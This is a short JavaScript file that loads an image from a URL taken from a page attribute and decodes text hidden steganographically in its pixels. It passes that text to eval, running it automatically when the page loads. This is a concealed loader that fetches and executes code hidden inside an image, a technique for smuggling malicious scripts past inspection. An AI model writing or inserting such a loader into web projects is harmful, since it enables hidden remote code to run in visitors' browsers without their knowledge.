Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}

function load() {
    var source = document.getElementById('source');
    var image = document.getElementById('cat');
    
    image.crossOrigin = "Anonymous";
    image.onload = function() {
        unpack(image);
    };
    
    image.src = source.getAttribute('data-url');
}

function unpack(data) {
    eval(steg.decode(data));
}

document.onload = load();